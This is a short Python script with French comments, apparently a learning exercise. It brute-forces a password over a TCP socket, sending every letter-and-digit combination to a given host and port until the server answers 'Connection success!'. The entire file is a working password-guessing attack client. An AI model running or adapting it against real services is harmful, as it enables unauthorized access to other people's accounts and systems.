import socket
import sys
import itertools

# definition d'un generateur
def generator(liste):
    for i in range(1, 1000000):
        for a in itertools.product(liste, repeat=i):
            password = "".join(a)
            yield str(password)

# stocke les arguments de ligne de commande dans args
args = sys.argv
# creation d'un socket
client_socket = socket.socket()
# connexion a un serveur
hostname = args[1]  # car 0 c'est le nom du scripte
port = int(args[2])
address = (hostname, port)
client_socket.connect(address)
# envoi de donnees au serveur
alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789'
# utilisation du generateur avec l'alphabet
gen = generator(alphabet)
while True:
    # creation du mdp lettre par lettre
    password = next(gen)
    password = password.encode()
    # envoi du mdp au serveur
    client_socket.send(password)
    # reception de la réponse du serveur
    response = client_socket.recv(1024)
    response = response.decode()
    if response == "Connection success!":
        print(password.decode())
        break
    else:
        continue
# fermeture du serveur
client_socket.close()